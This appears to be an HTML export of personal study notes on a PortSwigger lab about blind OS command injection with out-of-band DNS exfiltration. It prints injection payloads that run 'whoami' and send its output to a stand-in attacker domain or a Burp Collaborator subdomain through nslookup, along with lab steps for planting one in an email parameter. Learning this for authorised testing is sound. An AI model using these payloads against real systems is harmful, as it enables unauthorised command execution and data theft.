<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>with out-of-band data exfiltration</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>with out-of-band data exfiltration</h1><br/><br /><br /><h3>The out-of-band channel also provides an easy way to exfiltrate the output from injected commands:</h3><br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">&amp;</span> nslookup <span style="color:#333333;font-weight:400">`whoami`</span>.SUBDOMAIN.web-attacker.com <span style="color:#ff9d00;font-weight:700">&amp;</span></pre></div><br /><h3>This will cause a DNS lookup to the attacker&#39;s domain containing the result of the </h3><code><h3>whoami</h3></code><h3> command:</h3><br /><h5>wwwuser</h5><h5>.kgji2ohoyw.web-attacker.com</h5><br /><br /><br /><strong><h3>Exercise:</h3></strong><br /><br />1. Go to the Burp menu, and launch the Burp Collaborator client.<br />    <a href=""><img src="images/2253-1.png" alt="images/2253-1.png" /></a><br />    Click &quot;Copy to clipboard&quot; to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.<br />2. Intercept the Submit Request<br />    <a href=""><img src="images/2253-2.png" alt="images/2253-2.png" /></a><br />3. Modify the <code>email</code> parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:<br />    <div class="codebox"><pre><span style="color:#7f0044;font-weight:400">email</span>=<span style="color:#ff9d00;font-weight:700">||</span>nslookup+<span style="color:#333333;font-weight:400">`whoami`</span>.YOUR-SUBDOMAIN-HERE.burpcollaborator.net<span style="color:#ff9d00;font-weight:700">||</span></pre></div><br />    <a href=""><img src="images/2253-3.png" alt="images/2253-3.png" /></a><br />4. Go back to the Burp Collaborator client window, and click &quot;Poll now&quot;. You should see some DNS interactions that were initiated by the application as the result of your payload.<br />    <br />5. Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Burp Collaborator client. The full domain name that was looked up is shown in the Description tab for the interaction.<br />    <a href=""><img src="images/2253-4.png" alt="images/2253-4.png" /></a><br /><br /><br /><br /><strong>Bibliography:</strong><br /><a href="https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration">https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration</a></div>
</body>
</html>
